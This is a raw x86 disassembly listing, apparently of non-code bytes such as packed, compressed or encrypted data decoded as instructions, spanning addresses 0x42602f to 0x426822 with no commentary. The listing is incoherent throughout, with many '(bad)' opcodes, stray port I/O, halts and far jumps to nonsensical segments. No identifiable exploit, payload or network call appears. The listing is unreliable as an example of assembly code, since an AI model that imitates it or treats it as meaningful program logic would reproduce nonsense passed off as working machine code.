  42602f:	or     al,0xf7
  426031:	mov    ch,0xbd
  426033:	leave  
  426034:	in     al,0x51
  426036:	or     BYTE PTR [edi-0x160da8ff],dh
  42603c:	adc    eax,0x12b38ff3
  426041:	mov    cl,0x51
  426043:	pop    ebx
  426044:	push   ds
  426045:	mov    al,0xd2
  426047:	and    BYTE PTR [esi+edx*4+0x47],bl
  42604b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42604c:	dec    esp
  42604d:	retf   
  42604e:	loope  0x426075
  426050:	retf   0x66b8
  426053:	mov    DWORD PTR [esi],esi
  426055:	test   eax,0x15c89342
  42605a:	std    
  42605b:	xor    al,0xee
  42605d:	(bad)  
  42605e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42605f:	dec    eax
  426060:	adc    al,0xa0
  426062:	push   ebx
  426063:	bound  edx,QWORD PTR [ecx]
  426065:	cmp    BYTE PTR [ebx],ah
  426067:	or     ecx,0x7e73daf8
  42606d:	adc    cl,bl
  42606f:	mov    ebx,0x3743b029
  426074:	jl     0x4260c7
  426076:	(bad)  
  426077:	mov    al,0xb8
  426079:	jp     0x426018
  42607b:	jmp    0x0:0xe4760dab
  426082:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  426089:	fsubr  st(7),st
  42608b:	sub    DWORD PTR [ecx],0xffffff8c
  42608e:	mov    edx,DWORD PTR [edi-0x2cc7e03e]
  426094:	add    DWORD PTR [eax],eax
  426096:	add    eax,DWORD PTR es:[eax]
  426099:	add    BYTE PTR [ebp-0x3b],al
  42609c:	in     al,dx
  42609d:	(bad)
  4260a0:	push   0x63
  4260a2:	fs or  al,0x3d
  4260a5:	aas    
  4260a6:	fwait
  4260a7:	cwde   
  4260a8:	lahf   
  4260a9:	inc    eax
  4260aa:	fs loopne 0x42604c
  4260ad:	mov    esi,0x661c990d
  4260b2:	cmp    DWORD PTR [edx+eax*8-0x68],edi
  4260b6:	retf   
  4260b7:	mov    ebp,0x19a94ca4
  4260bc:	xchg   ebx,eax
  4260bd:	mov    gs,edx
  4260bf:	lahf   
  4260c0:	xor    al,0x73
  4260c2:	xchg   edi,eax
  4260c3:	mov    esp,0x4cc3c929
  4260c8:	mov    bh,0x8f
  4260ca:	mov    al,0xf8
  4260cc:	fs mov ds,edi
  4260cf:	pop    ebp
  4260d0:	sbb    DWORD PTR [eax-0x6],eax
  4260d3:	shl    ebx,1
  4260d5:	xchg   edi,eax
  4260d6:	pop    eax
  4260d7:	into   
  4260d8:	inc    ebp
  4260d9:	fdivr  QWORD PTR [ebp-0x2182ed90]
  4260df:	inc    edi
  4260e0:	fs retf 
  4260e2:	repz (bad) 
  4260e4:	mov    bh,0xe5
  4260e6:	cli    
  4260e7:	repnz adc eax,DWORD PTR [ebp-0x55]
  4260eb:	ror    BYTE PTR [ecx],0x4e
  4260ee:	adc    eax,0xf6192c07
  4260f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260f4:	rcpps  xmm6,xmm7
  4260f7:	mov    eax,0xc5f2ef89
  4260fc:	scas   eax,DWORD PTR es:[edi]
  4260fd:	inc    edx
  4260fe:	push   ds
  4260ff:	jne    0x42612f
  426101:	mov    eax,0x109a814c
  426106:	test   eax,0x92d65a63
  42610b:	push   es
  42610c:	rcr    DWORD PTR [ebp-0x38a179d2],cl
  426112:	mov    esp,0xa81364d2
  426117:	fs adc eax,0xdc65c96c
  42611d:	fdivrp st(0),st
  42611f:	mov    eax,ds:0x6ffc87b4
  426125:	add    BYTE PTR [eax-0x75a209ad],0xdf
  42612c:	cmp    DWORD PTR [esi],ebx
  42612e:	or     al,0x48
  426130:	cmp    al,0xb7
  426132:	je     0x4260b4
  426134:	fcomp  DWORD PTR ds:0xebed0eaa
  42613a:	inc    ecx
  42613b:	in     eax,0x5
  42613d:	mov    BYTE PTR [edx-0x71],ah
  426140:	das    
  426141:	outs   dx,DWORD PTR ds:[esi]
  426142:	mov    edx,0xeb06d1eb
  426147:	repz inc edx
  426149:	adc    eax,0x15e8c92f
  42614e:	lods   eax,DWORD PTR ds:[esi]
  42614f:	into   
  426150:	mov    bh,0xdb
  426152:	mov    eax,0x6fb407aa
  426157:	and    edx,DWORD PTR [eax-0x50]
  42615a:	mov    DWORD PTR [eax-0x51],edi
  42615d:	pushf  
  42615e:	push   cs
  42615f:	jmp    0x426171
  426161:	inc    eax
  426162:	cmp    DWORD PTR [edi+0x6b],0xffffffe0
  426166:	pop    ecx
  426167:	rcr    DWORD PTR [esi+eiz*2-0x39ab552d],cl
  42616e:	outs   dx,BYTE PTR ds:[esi]
  42616f:	in     al,dx
  426170:	fs stos BYTE PTR es:[edi],al
  426172:	xor    ebp,DWORD PTR [edi-0x7c]
  426175:	sbb    eax,0xe7b2588f
  42617a:	es mov ch,0x18
  42617d:	jg     0x42619a
  42617f:	lds    esi,FWORD PTR [eax+edi*2+0x44]
  426183:	sbb    eax,0x6f416332
  426188:	dec    ecx
  426189:	xchg   ebx,eax
  42618a:	fcomi  st,st(7)
  42618c:	adc    ebx,DWORD PTR [eax+ebp*1]
  42618f:	or     al,0x79
  426191:	inc    eax
  426192:	cmc    
  426193:	xchg   edi,eax
  426194:	dec    eax
  426195:	push   ss
  426196:	xor    al,0x5d
  426198:	xor    al,0x8b
  42619a:	xor    ebp,DWORD PTR [ecx]
  42619c:	not    DWORD PTR [eax-0x7de23521]
  4261a2:	aad    0xca
  4261a4:	cmp    esp,DWORD PTR [edi-0x2e]
  4261a7:	adc    ecx,edi
  4261a9:	jecxz  0x4261a0
  4261ab:	and    eax,0xd2ff530f
  4261b0:	out    0x44,eax
  4261b2:	xor    bh,BYTE PTR ds:0x6318260e
  4261b8:	imul   ebx,DWORD PTR [ecx+0x58],0x3f
  4261bc:	xchg   edx,eax
  4261bd:	mov    esp,0xf477397d
  4261c2:	lock jno 0x426209
  4261c5:	jns    0x426171
  4261c7:	add    BYTE PTR [esi],bl
  4261c9:	ja     0x42621b
  4261cb:	lds    ecx,FWORD PTR [ebx]
  4261cd:	sub    al,0xe5
  4261cf:	stos   BYTE PTR es:[edi],al
  4261d0:	out    0x71,eax
  4261d2:	call   0x44dfcc4b
  4261d7:	ret    
  4261d8:	imul   BYTE PTR [edx]
  4261da:	jb     0x42622a
  4261dc:	inc    edx
  4261dd:	mov    esp,0xad884d25
  4261e2:	(bad)  
  4261e4:	jg     0x426209
  4261e6:	jno    0x426169
  4261e8:	pusha  
  4261e9:	scas   eax,DWORD PTR es:[edi]
  4261ea:	mov    DWORD PTR [edi],ecx
  4261ec:	(bad)  
  4261ed:	out    0x4d,eax
  4261ef:	push   ecx
  4261f0:	inc    edi
  4261f1:	(bad)  
  4261f2:	xor    bl,BYTE PTR [edx-0x18]
  4261f5:	jge    0x42623e
  4261f7:	mov    DWORD PTR [edx+0x3f823eb4],eax
  4261fd:	push   cs
  4261fe:	adc    ecx,ecx
  426200:	loope  0x4261b6
  426202:	or     eax,0xea7451da
  426207:	dec    ebp
  426208:	mov    ebx,0x3763cca
  42620d:	cmc    
  42620e:	adc    eax,0x7026655c
  426213:	mov    ch,0xf5
  426215:	rol    DWORD PTR [ebx],0x1d
  426218:	xor    eax,0x99394aaf
  42621d:	jmp    0x15b7:0xa7b01c12
  426224:	imul   ecx,edx,0xffffffed
  426227:	lds    ebp,FWORD PTR [esi]
  426229:	push   esi
  42622a:	ss push esi
  42622c:	icebp  
  42622d:	xchg   DWORD PTR [esi-0x3f80129a],ebx
  426233:	hlt    
  426234:	adc    DWORD PTR [esi+0x247f43c5],edx
  42623a:	stos   BYTE PTR es:[edi],al
  42623b:	sub    cl,BYTE PTR [ecx-0x37beae35]
  426241:	add    edi,edx
  426243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426244:	sbb    DWORD PTR [edi],ebp
  426246:	iret   
  426247:	jle    0x4261e3
  426249:	cdq    
  42624a:	xor    eax,0xe0f14e25
  42624f:	fxch   st(4)
  426251:	ja     0x42626d
  426253:	std    
  426254:	in     eax,dx
  426255:	clc    
  426256:	in     al,0x79
  426258:	dec    esp
  426259:	push   0x4d
  42625b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42625c:	mov    ecx,0xc88281ac
  426261:	or     esp,ebx
  426263:	sub    dl,bl
  426265:	dec    edi
  426266:	jo     0x4262d8
  426268:	dec    ebx
  426269:	add    BYTE PTR [ecx+edx*1],dl
  42626c:	in     eax,dx
  42626d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42626e:	jp     0x4262bd
  426270:	pop    ds
  426271:	and    BYTE PTR [edi],ch
  426273:	les    esi,FWORD PTR [edi+ebp*1]
  426276:	clc    
  426277:	fwait
  426278:	or     cl,dl
  42627a:	mov    edx,0x6d039897
  42627f:	pop    ecx
  426280:	jbe    0x426243
  426282:	outs   dx,BYTE PTR ds:[esi]
  426283:	mov    edi,0xba48ed63
  426288:	and    eax,0xbb9b9cc7
  42628d:	leave  
  42628e:	jns    0x42626d
  426290:	xchg   esp,eax
  426291:	mov    ah,0xf9
  426293:	jg     0x4262f1
  426295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426296:	jnp    0x42622f
  426298:	shr    DWORD PTR [ebx+0x34],0x91
  42629c:	xchg   ebx,eax
  42629d:	fs xchg esi,eax
  42629f:	pop    ebx
  4262a0:	pop    ebx
  4262a1:	rcr    DWORD PTR [ebx],cl
  4262a3:	daa    
  4262a4:	mov    esi,0x92a3609b
  4262a9:	add    al,0x5e
  4262ab:	dec    eax
  4262ac:	test   al,0x32
  4262ae:	and    DWORD PTR [edx+0x64],0x929d0dc1
  4262b5:	in     al,0x8
  4262b7:	std    
  4262b8:	lds    edx,FWORD PTR [ecx-0xa]
  4262bb:	fld    DWORD PTR [edx-0xb]
  4262be:	(bad)  
  4262bf:	xchg   DWORD PTR [ebx+0x60c253e4],esi
  4262c5:	xor    DWORD PTR [eax+0x48d5ce57],esp
  4262cb:	sar    DWORD PTR [ebp+0x0],cl
  4262ce:	pop    edi
  4262cf:	xchg   esi,eax
  4262d0:	call   0xe7d13ebd
  4262d5:	or     edx,DWORD PTR [edx+0x6a]
  4262d8:	aas    
  4262d9:	(bad)  
  4262db:	sub    bl,al
  4262dd:	mov    esi,0x51192709
  4262e2:	pop    edx
  4262e3:	loope  0x426281
  4262e5:	in     al,dx
  4262e6:	jg     0x426277
  4262e8:	int    0xd5
  4262ea:	add    eax,0x484f77bd
  4262ef:	ret    
  4262f0:	cmp    edi,DWORD PTR [esi-0x2b84e01e]
  4262f6:	or     BYTE PTR [esi-0x3d],dh
  4262f9:	adc    edi,edx
  4262fb:	clc    
  4262fc:	fist   DWORD PTR [esi-0x1d0d525d]
  426302:	loopne 0x4262a5
  426304:	(bad)  
  426305:	shr    BYTE PTR [eax+esi*1-0x5f],1
  426309:	mov    bh,0x10
  42630b:	push   eax
  42630c:	sbb    ebx,DWORD PTR [eax+0x35b8e6fc]
  426312:	add    BYTE PTR [eax-0x4c],bh
  426315:	(bad)  
  426316:	out    dx,al
  426317:	es (bad) 
  42631a:	loope  0x42638e
  42631c:	iret   
  42631d:	fnstsw WORD PTR [ebx+0x71ec03f0]
  426323:	ja     0x42638c
  426325:	inc    edx
  426326:	sub    DWORD PTR [ebx],0xec0ea602
  42632c:	lahf   
  42632d:	inc    ebx
  42632e:	outs   dx,BYTE PTR ds:[esi]
  42632f:	leave  
  426330:	icebp  
  426331:	stos   BYTE PTR es:[edi],al
  426332:	mov    WORD PTR [ebx+0x15],ss
  426335:	pop    edi
  426336:	rcr    BYTE PTR [ebx+0x76b1eb34],1
  42633c:	pop    ss
  42633d:	sbb    ebx,DWORD PTR cs:[edx]
  426340:	mov    ebx,ds
  426342:	cmp    DWORD PTR [edi+ebp*4],0x9aadf98
  426349:	leave  
  42634a:	fwait
  42634b:	mov    al,ds:0x4dfcc8cf
  426350:	and    BYTE PTR es:[ebx+edi*1-0x2ec56b80],dh
  426358:	addr16 (bad) 
  42635a:	cli    
  42635b:	push   esi
  42635c:	pop    ecx
  42635d:	or     esi,eax
  42635f:	mov    al,0x69
  426361:	jmp    DWORD PTR [eax]
  426363:	clc    
  426364:	adc    dh,BYTE PTR [edi]
  426366:	fisubr DWORD PTR [ebx+0x480865ce]
  42636c:	xor    al,0xe
  42636e:	addr16 jmp 0x426339
  426371:	mov    ah,BYTE PTR [edx+eax*1-0x232d7301]
  426378:	test   DWORD PTR [ebx],0x299e3138
  42637e:	loopne 0x42634a
  426380:	or     BYTE PTR [edx-0x468c5c09],dh
  426386:	repz fbstp TBYTE PTR [ebp+0x7d0c53c7]
  42638d:	jbe    0x426335
  42638f:	dec    ecx
  426390:	adc    al,0xe8
  426392:	sbb    DWORD PTR [edi-0x20],edi
  426395:	mov    cl,0xbe
  426397:	jmp    0x945a:0x377afbe
  42639e:	pop    ss
  42639f:	scas   eax,DWORD PTR es:[edi]
  4263a0:	test   al,0xe0
  4263a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263a3:	jns    0x4263df
  4263a5:	dec    esi
  4263a6:	out    dx,eax
  4263a7:	nop
  4263a8:	js     0x42634d
  4263aa:	enter  0xf182,0xd4
  4263ae:	mov    eax,ds:0x63726dd5
  4263b3:	xchg   edi,eax
  4263b4:	jmp    0x426403
  4263b6:	(bad)  
  4263b7:	out    dx,eax
  4263b8:	adc    ecx,ebp
  4263ba:	test   eax,0x4c03c9bd
  4263bf:	mov    ebx,0xaa400000
  4263c4:	pop    edx
  4263c5:	sbb    bh,dl
  4263c7:	cli    
  4263c8:	inc    eax
  4263c9:	cli    
  4263ca:	outs   dx,BYTE PTR ds:[esi]
  4263cb:	jmp    0x56c:0xc78be400
  4263d2:	pop    esi
  4263d3:	(bad)  
  4263d4:	add    DWORD PTR [eax],eax
  4263d6:	add    eax,DWORD PTR es:[eax]
  4263d9:	add    BYTE PTR [ebx-0x1904d52f],bl
  4263df:	push   ss
  4263e0:	xor    BYTE PTR [edi],ch
  4263e2:	push   edx
  4263e3:	and    eax,0x86f20a7
  4263e8:	xchg   ecx,eax
  4263e9:	and    dl,BYTE PTR [ecx+0x22]
  4263ec:	(bad)  
  4263ed:	mov    WORD PTR [ecx-0x4b],?
  4263f0:	mov    eax,0x44700d62
  4263f5:	pop    ds
  4263f6:	mov    ds:0xd2f0ce5c,al
  4263fb:	jmp    0xaa525190
  426400:	push   edi
  426401:	add    edx,edx
  426403:	jmp    0x426419
  426405:	ja     0x426450
  426407:	retf   0xc144
  42640a:	call   DWORD PTR [edx]
  42640c:	jp     0x426419
  42640e:	xlat   BYTE PTR ds:[ebx]
  42640f:	js     0x426412
  426411:	add    DWORD PTR ds:0xf18dbee2,ecx
  426417:	enter  0x5e8f,0xbe
  42641b:	loop   0x4263f4
  42641d:	xchg   ebx,eax
  42641e:	inc    eax
  42641f:	sub    esi,edx
  426421:	inc    BYTE PTR [ebx-0x5df9a3a3]
  426427:	xor    BYTE PTR [ebx-0x25],0x4b
  42642b:	aaa    
  42642c:	mul    BYTE PTR [ecx-0x66]
  42642f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426430:	add    BYTE PTR [ebx],0x3c
  426433:	adc    DWORD PTR [esi+0x11],edx
  426436:	int    0xee
  426438:	icebp  
  426439:	xchg   DWORD PTR [eax+0x11],eax
  42643c:	inc    ebx
  42643d:	add    ebx,DWORD PTR [eax+0x6a05c28f]
  426443:	mov    ah,0x92
  426445:	jecxz  0x4263d9
  426447:	pop    es
  426448:	call   0x9606:0x897d403f
  42644f:	mov    ebp,0x34ea7d31
  426454:	xor    BYTE PTR [ebx],0x46
  426457:	pop    esp
  426458:	psubd  mm0,mm3
  42645b:	adc    ah,BYTE PTR [eax-0x4fcfa2c6]
  426461:	sub    al,0x4
  426463:	jle    0x426479
  426465:	inc    ecx
  426466:	aas    
  426467:	out    dx,eax
  426468:	push   eax
  426469:	inc    ebp
  42646a:	sahf   
  42646b:	scas   eax,DWORD PTR es:[edi]
  42646c:	loop   0x4264d8
  42646e:	jg     0x42640a
  426470:	xor    esp,DWORD PTR [edx]
  426472:	call   0xc615:0xd7ffe30e
  426479:	dec    eax
  42647a:	sbb    eax,0x65463e9b
  42647f:	mov    ds:0x43de10bd,eax
  426484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426485:	dec    edx
  426486:	or     ebx,ecx
  426488:	call   0xf649:0x8e935e74
  42648f:	pop    edi
  426490:	mov    BYTE PTR ds:[edx],dl
  426493:	call   0xf1cc67b1
  426498:	lds    bx,DWORD PTR ds:[edi-0x6cace644]
  4264a0:	add    eax,0x4930cfc
  4264a5:	push   esi
  4264a6:	xlat   BYTE PTR ds:[ebx]
  4264a7:	mov    ch,0x3
  4264a9:	(bad)  [edi-0xe3ca7ed]
  4264af:	(bad)  
  4264b1:	xor    al,ch
  4264b3:	jb     0x42644b
  4264b5:	les    edi,FWORD PTR ds:0x7fca8f33
  4264bb:	jo     0x426464
  4264bd:	inc    edi
  4264be:	push   ebx
  4264bf:	add    al,0x47
  4264c1:	xchg   ecx,eax
  4264c2:	cmp    dl,0xd2
  4264c5:	adc    BYTE PTR [ebx-0x61],bl
  4264c8:	ret    0x74f6
  4264cb:	add    DWORD PTR [ecx+0x21d500db],ebp
  4264d1:	pop    esp
  4264d2:	mov    ds:0x21bcd384,eax
  4264d7:	mov    ah,BYTE PTR [ebx-0x4b]
  4264da:	pop    es
  4264db:	sub    BYTE PTR [edi+0x20],al
  4264de:	or     BYTE PTR [ebx],dl
  4264e0:	(bad)  
  4264e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264e2:	jno    0x426517
  4264e4:	sub    DWORD PTR [ebp-0x61521ecd],edx
  4264ea:	sub    DWORD PTR [eax-0x10],0xffffff96
  4264ee:	mov    gs:0xc4dc5571,eax
  4264f4:	pusha  
  4264f5:	stc    
  4264f6:	imul   ebx,DWORD PTR [esp+esi*4-0x2c],0xffffffaf
  4264fb:	(bad)  
  4264fc:	jb     0x4264e9
  4264fe:	jnp    0x4264a5
  426500:	pop    ecx
  426501:	clc    
  426502:	mov    ds,WORD PTR [edi+0x9772321]
  426508:	sub    al,0x8
  42650a:	loop   0x426532
  42650c:	lahf   
  42650d:	ret    0x3166
  426510:	xchg   DWORD PTR [ebx-0x702bf823],edi
  426516:	cmp    edi,DWORD PTR [edi]
  426518:	test   DWORD PTR [ecx-0x19],esp
  42651b:	jns    0x426566
  42651d:	or     al,0x57
  42651f:	rol    DWORD PTR [esi-0x70],1
  426522:	pop    esi
  426523:	cmc    
  426524:	(bad)  
  426525:	call   0xce5e85e
  42652a:	xchg   BYTE PTR [ebp+0x23187070],bh
  426530:	xor    BYTE PTR [edi-0x27],cl
  426533:	mov    ecx,DWORD PTR [ecx+0x3f418809]
  426539:	inc    esp
  42653a:	push   esi
  42653b:	mov    edi,0x4208fff4
  426540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426541:	jo     0x426553
  426543:	retf   
  426544:	fs push ss
  426546:	xor    BYTE PTR [eax-0x63bbd310],0x67
  42654d:	adc    eax,0x8192e4fe
  426552:	push   esp
  426553:	bound  esi,QWORD PTR [esi-0x3dfe25f2]
  426559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42655a:	pop    ecx
  42655b:	dec    ebp
  42655c:	inc    esi
  42655d:	dec    esp
  42655e:	cmp    edi,DWORD PTR [eax+0x78cacc60]
  426564:	arpl   WORD PTR [ebx],sp
  426566:	popf   
  426567:	mov    DWORD PTR [ebp-0x353d4e5f],eax
  42656d:	push   es
  42656e:	retf   0x2690
  426571:	ret    
  426572:	cs adc al,0xdc
  426575:	inc    eax
  426576:	and    BYTE PTR [esi-0xe45f96a],0xfb
  42657d:	movhps QWORD PTR [eax+0x2d],xmm4
  426581:	jns    0x426507
  426583:	lods   al,BYTE PTR ds:[esi]
  426584:	xchg   edi,eax
  426585:	mov    edx,0xe71706d
  42658a:	leave  
  42658b:	jnp    0x4265bc
  42658d:	pushf  
  42658e:	mov    ebx,0x2465bd0c
  426593:	xlat   BYTE PTR ds:[ebx]
  426594:	out    dx,al
  426595:	push   0x68
  426597:	(bad)  
  426598:	shl    ebp,cl
  42659a:	je     0x4265c1
  42659c:	int3   
  42659d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42659e:	sti    
  42659f:	lods   al,BYTE PTR ds:[esi]
  4265a0:	inc    ebp
  4265a1:	repnz int 0x73
  4265a4:	int3   
  4265a5:	xchg   ebp,eax
  4265a6:	(bad)  
  4265a7:	in     al,0xf7
  4265a9:	popa   
  4265aa:	ins    BYTE PTR es:[edi],dx
  4265ab:	or     edi,ebp
  4265ad:	ja     0x426536
  4265af:	add    BYTE PTR [esi-0x23a1d4c4],ah
  4265b5:	and    DWORD PTR [ebp-0x17c0d09a],edx
  4265bb:	repnz mov DWORD PTR [ebp+0x49a91a2b],0x56595a7f
  4265c6:	pop    ss
  4265c7:	ins    BYTE PTR es:[edi],dx
  4265c8:	mov    ch,0x1f
  4265ca:	dec    edi
  4265cb:	pop    ss
  4265cc:	mov    ah,0x59
  4265ce:	aam    0xb9
  4265d0:	ret    
  4265d1:	sbb    DWORD PTR [ecx-0x11],ebp
  4265d4:	fwait
  4265d5:	add    ah,BYTE PTR [eax+0x915ea44]
  4265db:	sbb    BYTE PTR [eax+0x372e279f],al
  4265e1:	or     al,0x63
  4265e3:	pop    ds
  4265e4:	pop    ss
  4265e5:	je     0x426615
  4265e7:	push   esi
  4265e8:	add    ebp,ebx
  4265ea:	retf   0xf535
  4265ed:	ds adc al,0xea
  4265f0:	pop    ds
  4265f1:	loope  0x4265ca
  4265f3:	pop    ds
  4265f4:	pop    ss
  4265f5:	jl     0x426609
  4265f7:	sub    edx,esp
  4265f9:	ret    
  4265fa:	lea    esp,[ebp+eiz*2+0x41]
  4265fe:	inc    eax
  4265ff:	sub    ecx,DWORD PTR [esi+0x4d]
  426602:	push   esi
  426603:	mov    bh,0xab
  426605:	dec    edi
  426606:	inc    eax
  426607:	jecxz  0x426641
  426609:	push   ebx
  42660a:	std    
  42660b:	push   cs
  42660c:	xor    DWORD PTR [edx],ebp
  42660e:	sar    eax,cl
  426610:	xchg   esi,eax
  426611:	dec    edx
  426612:	mov    bl,0xf4
  426614:	fsub   QWORD PTR [edx-0xb]
  426617:	dec    ebp
  426618:	(bad)  
  426619:	xor    eax,0x6e61c3b0
  42661e:	jl     0x426627
  426620:	mov    ebp,gs
  426622:	pop    edx
  426623:	imul   esi,DWORD PTR [ebx+edx*4+0x4c],0xffffff98
  426628:	(bad)  
  426629:	jbe    0x42660d
  42662b:	jnp    0x426663
  42662d:	mov    edi,0xcc588886
  426632:	pop    eax
  426633:	and    ecx,DWORD PTR [edx+0x43]
  426636:	test   BYTE PTR [edx+eax*8],bh
  426639:	loop   0x42668a
  42663b:	cs sti 
  42663d:	jbe    0x426645
  42663f:	add    DWORD PTR [eax],0x7d
  426642:	fsubrp st(1),st
  426644:	jo     0x4265fa
  426646:	sub    BYTE PTR [ebp+eax*8+0x2c217edf],bl
  42664d:	or     eax,0x173e0696
  426652:	sub    bl,bl
  426654:	lds    esi,FWORD PTR [ecx+0x74]
  426657:	xor    cl,BYTE PTR [eax]
  426659:	test   al,0x4b
  42665b:	fsub   QWORD PTR [esi-0x7acf918b]
  426661:	mov    esp,0xc53325c0
  426666:	pop    es
  426667:	adc    edi,DWORD PTR [eax+0x3a320420]
  42666d:	xor    al,BYTE PTR [esi]
  42666f:	xor    eax,0x3213c9dc
  426674:	fldenv [edx+0x33]
  426677:	shl    BYTE PTR [eax+0x3a],cl
  42667a:	dec    esp
  42667b:	loop   0x42669d
  42667d:	pop    esi
  42667e:	nop
  42667f:	fiadd  WORD PTR [ecx]
  426681:	pop    ecx
  426682:	call   0xdf77:0x9e5d449
  426689:	shl    DWORD PTR [edi-0x3be15feb],0xef
  426690:	sbb    esi,ecx
  426692:	jno    0x4266c2
  426694:	cdq    
  426695:	mov    ebp,0x78b77c16
  42669a:	mov    esp,edx
  42669c:	jae    0x426625
  42669e:	push   ebp
  42669f:	sbb    ah,BYTE PTR [ecx+0x454fc3af]
  4266a5:	pusha  
  4266a6:	add    al,0xef
  4266a8:	cmp    BYTE PTR [edx-0x4893514d],ch
  4266ae:	lds    ebp,FWORD PTR [edi]
  4266b0:	lods   eax,DWORD PTR ds:[esi]
  4266b1:	cwde   
  4266b2:	pop    ds
  4266b3:	daa    
  4266b4:	push   edx
  4266b5:	or     al,0x22
  4266b7:	xchg   esp,eax
  4266b8:	imul   ecx,DWORD PTR [ecx],0x930d118e
  4266be:	test   BYTE PTR [edi],dh
  4266c0:	std    
  4266c1:	fcmovne st,st(1)
  4266c3:	ror    DWORD PTR [ebp-0x5d461733],1
  4266c9:	arpl   WORD PTR [eax+edi*4+0x9],sp
  4266cd:	push   ebx
  4266ce:	dec    ebp
  4266cf:	test   DWORD PTR [ebx-0x345bfe10],ecx
  4266d5:	lods   eax,DWORD PTR ds:[esi]
  4266d7:	pop    esp
  4266d8:	imul   ecx,DWORD PTR [edi],0xfe33c0f9
  4266de:	adc    al,0x9b
  4266e0:	icebp  
  4266e1:	xor    eax,0x95c31673
  4266e6:	pop    esp
  4266e7:	add    dl,BYTE PTR [ecx]
  4266e9:	sub    DWORD PTR [edi-0x2dcb4032],edi
  4266ef:	mov    ds:0xcc86312d,al
  4266f4:	fistp  QWORD PTR [esi+0x56]
  4266f7:	lahf   
  4266f8:	lahf   
  4266f9:	cdq    
  4266fa:	repz and dh,BYTE PTR [eax*4+0x5acc]
  426702:	mov    dh,0xe4
  426704:	xlat   BYTE PTR ds:[ebx]
  426705:	push   esp
  426706:	xlat   BYTE PTR ds:[ebx]
  426707:	ja     0x4266c0
  426709:	out    0xf3,al
  42670b:	ss icebp 
  42670d:	mov    esp,0x67ff6500
  426712:	test   cl,bl
  426714:	add    DWORD PTR [eax],eax
  426716:	add    eax,DWORD PTR es:[eax]
  426719:	add    ch,ch
  42671b:	aas    
  42671c:	pop    ds
  42671d:	mov    ebp,0xd72be9df
  426722:	add    BYTE PTR [eax],ah
  426724:	inc    edi
  426725:	clc    
  426726:	cwde   
  426727:	loope  0x426786
  426729:	inc    ecx
  42672a:	lds    esi,FWORD PTR fs:[edx+0x7d]
  42672e:	cs add al,0x79
  426731:	loopne 0x426723
  426733:	loopne 0x426798
  426735:	loopne 0x426730
  426737:	fwait
  426738:	cmp    eax,DWORD PTR [ecx-0x69a2d7a]
  42673e:	or     eax,0xb2063e87
  426743:	icebp  
  426744:	adc    eax,0x864a09ee
  426749:	cmp    DWORD PTR cs:[eax+0x3695e559],eax
  426750:	xchg   edi,eax
  426751:	dec    ebx
  426752:	data16 adc BYTE PTR [ebx],cl
  426755:	aam    0xb7
  426757:	inc    edx
  426758:	es add eax,0x8d52c91e
  42675e:	int3   
  42675f:	das    
  426760:	lock xor al,0x77
  426763:	xor    esp,DWORD PTR [edx]
  426765:	dec    esp
  426766:	mov    ds:0x3bbe90bf,al
  42676b:	int3   
  42676c:	inc    esp
  42676d:	fcmove st,st(1)
  42676f:	jmp    0x426794
  426771:	mov    al,0x78
  426773:	aad    0xa5
  426775:	pop    ds
  426776:	jmp    0x4267c1
  426778:	(bad)  
  426779:	lock (bad) 
  42677b:	jo     0x426703
  42677d:	ins    DWORD PTR es:[edi],dx
  42677e:	xlat   BYTE PTR ds:[ebx]
  42677f:	inc    edi
  426780:	dec    ecx
  426781:	add    bl,BYTE PTR [ebp-0x55862c34]
  426787:	mov    al,0xd4
  426789:	add    edi,DWORD PTR [ecx+0x44]
  42678c:	jle    0x426732
  42678e:	loope  0x426772
  426790:	xor    eax,0x60c70b43
  426795:	lods   eax,DWORD PTR ds:[esi]
  426796:	fnstenv [ebx+0x211d7b1a]
  42679c:	or     BYTE PTR [ebp+0x67],dl
  42679f:	dec    ebx
  4267a0:	frstor [esp+ebp*1]
  4267a3:	sbb    al,0xb0
  4267a5:	mov    cl,0x35
  4267a7:	push   0xa6743063
  4267ac:	xor    al,0x6
  4267ae:	popa   
  4267af:	jge    0x4267b0
  4267b1:	cmp    DWORD PTR [edi+0x4243adf0],esp
  4267b7:	adc    BYTE PTR [edx+eax*1-0x5ff4aacb],ch
  4267be:	inc    edi
  4267bf:	outs   dx,DWORD PTR ds:[esi]
  4267c0:	add    eax,0x47737230
  4267c5:	xor    ecx,edx
  4267c7:	into   
  4267c8:	xor    eax,0xff2bcd5a
  4267cd:	jg     0x426837
  4267cf:	bound  esi,QWORD PTR [eax-0x48]
  4267d2:	(bad)  
  4267d4:	fnstcw WORD PTR [ecx+0x41]
  4267d7:	or     eax,0x76f85b2f
  4267dc:	add    DWORD PTR [esi+eax*8+0x503b23a4],ebp
  4267e3:	adc    BYTE PTR [eax-0x68],bh
  4267e6:	add    eax,0xbde20a81
  4267eb:	cmp    ecx,DWORD PTR [ecx]
  4267ed:	retf   
  4267ee:	cmp    eax,0x47bf06a0
  4267f3:	in     al,0x7d
  4267f5:	pop    edi
  4267f6:	imul   ebp,DWORD PTR [esi-0x7f323651],0x1d
  4267fd:	cld    
  4267fe:	dec    ecx
  4267ff:	inc    esp
  426800:	fcom   DWORD PTR [eax]
  426802:	lahf   
  426803:	mov    ch,0x3e
  426805:	mov    esp,0x7eb71014
  42680a:	sbb    BYTE PTR [esi],0x1f
  42680d:	mov    WORD PTR [edi+esi*2+0x21],ss
  426811:	sbb    dh,BYTE PTR [edx+0x186a9173]
  426817:	xlat   BYTE PTR ds:[ebx]
  426818:	mov    edi,DWORD PTR [eax-0x2e67e30b]
  42681e:	int3   
  42681f:	sbb    al,cl
  426821:	inc    esi
  426822:	loopne 0x4267d5
